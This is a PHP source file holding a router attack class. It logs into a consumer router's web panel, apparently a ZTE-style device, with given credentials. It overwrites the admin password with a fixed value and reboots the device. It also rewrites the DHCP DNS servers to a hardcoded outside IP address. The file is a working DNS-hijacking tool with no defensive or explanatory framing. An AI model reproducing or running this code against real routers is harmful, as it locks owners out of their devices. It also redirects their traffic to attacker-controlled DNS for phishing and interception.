<?php

class TWOEIGTHZE
{
	private $ch;
	private $Host;
	private $User;
	private $Pass;
	function __construct()
	{
		$this->ch = curl_init();
	}
	public function Login($Host,$User,$Pass)
	{
		$ch = curl_init();
		curl_setopt($this->ch, CURLOPT_URL, "http://{$Host}/");
		curl_setopt($this->ch, CURLOPT_HEADER, 1);
		curl_setopt($this->ch, CURLOPT_FOLLOWLOCATION, 1	);
		curl_setopt($this->ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($this->ch, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($this->ch, CURLOPT_POSTFIELDS, "frashnum=&action=login&Frm_Logintoken=1&Username={$User}&Password={$Pass}");
		curl_setopt($this->ch, CURLOPT_POST, 1);
		curl_setopt($this->ch, CURLOPT_USERPWD, $User. ":" . $Pass);
		curl_setopt($this->ch, CURLOPT_COOKIEJAR, "cookies.txt");
        curl_setopt($this->ch, CURLOPT_CONNECTTIMEOUT ,8);
        curl_setopt($this->ch, CURLOPT_TIMEOUT, 8);
		$headers = array();
		$headers[] = "Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.6,en;q=0.4";
		$headers[] = "Upgrade-Insecure-Requests: 1";
		$headers[] = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.98 Safari/537.36";
		$headers[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";
		$headers[] = "Referer: http://{$Host}/";
		$headers[] = "Connection: keep-alive";
		$headers[] = "Content-Type:application/x-www-form-urlencoded";
		curl_setopt($this->ch, CURLOPT_HTTPHEADER, $headers);
		$result = curl_exec($this->ch);
		echo $result;
		$Status = (strpos($result,"Error") == false) ? true : false;
		if ($Status)
		{
			$this->Host = $Host;
			$this->User = $User;
			$this->Pass = $Pass;
		}
		return $Status;
	}
	
		public function DoOthers($Host,$User,$Pass)
		{
			$Url = "http://{$Host}/getpage.gch?pid=1002&nextpage=manager_aduser_conf_t.gch";
			curl_setopt($this->ch, CURLOPT_URL, "{$Url}");
			curl_setopt($this->ch, CURLOPT_HEADER, 1);
			curl_setopt($this->ch, CURLOPT_FOLLOWLOCATION, 1);
			curl_setopt($this->ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($this->ch, CURLOPT_POSTFIELDS, "IF_ACTION=apply&IF_ERRORSTR=SUCC&IF_ERRORPARAM=SUCC&IF_ERRORTYPE=-1&IF_INDEX=0&Type=NULL&Enable=NULL&Username=admin&Password=passthehash&Right=NULL&Type0=1&Enable0=1&Username0=admin&Password0=******&Right0=1&Type1=1&Enable1=1&Username1=user&Password1=******&Right1=2&IF_APPLYFLAG=0&IF_MULTIDISPLAY=1&flag=1&OldPassword=admin");
			curl_setopt($this->ch, CURLOPT_POST, 1);
			curl_setopt($this->ch, CURLOPT_SSL_VERIFYPEER, false);
			curl_setopt($this->ch, CURLOPT_USERPWD, $User. ":" . $Pass);
			curl_setopt($this->ch, CURLOPT_COOKIEFILE, "cookies.txt");
			$headers = array();
			$headers[] = "Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.6,en;q=0.4";
			$headers[] = "Upgrade-Insecure-Requests: 1";
			$headers[] = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.98 Safari/537.36";
			$headers[] = "Content-Type: application/x-www-form-urlencoded";
			$headers[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";
			$headers[] = "Referer: http://{$Host}/getpage.gch?pid=&nextpage=net_dhcp_dynamic_t.gch";
			$headers[] = "Connection: keep-alive";
			curl_setopt($this->ch, CURLOPT_HTTPHEADER, $headers);
			$result = curl_exec($this->ch);echo $result;
			$Url = "http://{$Host}/getpage.gch?pid=1002&nextpage=manager_dev_conf_t.gch";
			curl_setopt($this->ch, CURLOPT_URL, "{$Url}");
			curl_setopt($this->ch, CURLOPT_HEADER, 1);
			curl_setopt($this->ch, CURLOPT_FOLLOWLOCATION, 1);
			curl_setopt($this->ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($this->ch, CURLOPT_POSTFIELDS, "IF_ACTION=devrestart&IF_ERRORSTR=SUCC&IF_ERRORPARAM=SUCC&IF_ERRORTYPE=-1&flag=1");
			curl_setopt($this->ch, CURLOPT_POST, 1);
			curl_setopt($this->ch, CURLOPT_SSL_VERIFYPEER, false);
			curl_setopt($this->ch, CURLOPT_USERPWD, $User. ":" . $Pass);
			curl_setopt($this->ch, CURLOPT_COOKIEFILE, "cookies.txt");
			$headers = array();
			$headers[] = "Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.6,en;q=0.4";
			$headers[] = "Upgrade-Insecure-Requests: 1";
			$headers[] = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.98 Safari/537.36";
			$headers[] = "Content-Type: application/x-www-form-urlencoded";
			$headers[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";
			$headers[] = "Referer: http://{$Host}/getpage.gch?pid=&nextpage=net_dhcp_dynamic_t.gch";
			$headers[] = "Connection: keep-alive";
			curl_setopt($this->ch, CURLOPT_HTTPHEADER, $headers);
			$result = curl_exec($this->ch);echo $result;
			$Status = (strpos($result,'"'.$DNS1.'",') !== false) ? true : false;
			//return $Status;
			return true;
		}
	
		public function ChangeDNS($Host,$User,$Pass,$DNS1,$DNS2)
		{
			curl_setopt($this->ch, CURLOPT_URL, "http://{$Host}/template.gch?pid=&nextpage=net_dhcp_dynamic_t.gch");
			curl_setopt($this->ch, CURLOPT_HEADER, 1);
			curl_setopt($this->ch, CURLOPT_FOLLOWLOCATION, 0);
			curl_setopt($this->ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($this->ch, CURLOPT_SSL_VERIFYPEER, false);
			curl_setopt($this->ch, CURLOPT_USERPWD, $User. ":" . $Pass);
			curl_setopt($this->ch, CURLOPT_COOKIEFILE, "cookies.txt");
			$headers = array();
			$headers[] = "Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.6,en;q=0.4";
			$headers[] = "Upgrade-Insecure-Requests: 1";
			$headers[] = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.98 Safari/537.36";
			$headers[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";
			$headers[] = "Referer: http://{$Host}/userRpm/LanDhcpServerRpm.htm";
			$headers[] = "Connection: keep-alive";
			curl_setopt($this->ch, CURLOPT_HTTPHEADER, $headers);
			$result = curl_exec($this->ch);
			echo $result;
			$Url = "http://{$Host}/getpage.gch?pid=1002&nextpage=net_dhcp_dynamic_t.gch";
			curl_setopt($this->ch, CURLOPT_URL, "{$Url}");
			curl_setopt($this->ch, CURLOPT_HEADER, 1);
			curl_setopt($this->ch, CURLOPT_FOLLOWLOCATION, 1);
			curl_setopt($this->ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($this->ch, CURLOPT_POSTFIELDS, "IF_ACTION=apply&IF_ERRORSTR=SUCC&IF_ERRORPARAM=SUCC&IF_ERRORTYPE=-1&IF_INDEX=NULL&IF_INSTNUM=1&ETHIfNum=NULL&USBIfNum=NULL&WLANIfNum=NULL&Enable=NULL&DNSServer1=107.155.152.15&DNSServer2=8.8.8.2&DNSServer3={$DNS2}&LeaseTime=86400&UseAllocatedWAN=NULL&AssociatedConnection=NULL&PassthroughLease=NULL&PassthroughCSP_MACAddress=NULL&AllowedCSP_MACAddresses=NULL&DHCPConditionalServing=NULL&DnsServerSource=0&MACAddr=&IPAddr=&HostName=&ExpiredTime=&PhyPortName=&MACAddr0=c0%3A4a%3A00%3A5c%3Ae8%3A03&ExpiredTime0=49567&PhyPortName0=LAN1");
			curl_setopt($this->ch, CURLOPT_POST, 1);
			curl_setopt($this->ch, CURLOPT_SSL_VERIFYPEER, false);
			curl_setopt($this->ch, CURLOPT_USERPWD, $User. ":" . $Pass);
			curl_setopt($this->ch, CURLOPT_COOKIEFILE, "cookies.txt");
			$headers = array();
			$headers[] = "Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.6,en;q=0.4";
			$headers[] = "Upgrade-Insecure-Requests: 1";
			$headers[] = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.98 Safari/537.36";
			$headers[] = "Content-Type: application/x-www-form-urlencoded";
			$headers[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";
			$headers[] = "Referer: http://{$Host}/getpage.gch?pid=&nextpage=net_dhcp_dynamic_t.gch";
			$headers[] = "Connection: keep-alive";
			curl_setopt($this->ch, CURLOPT_HTTPHEADER, $headers);
			$result = curl_exec($this->ch);echo $result;
			$Status = (strpos($result,'"'.$DNS1.'",') !== false) ? true : false;
			return $Status;
		}
	

	
}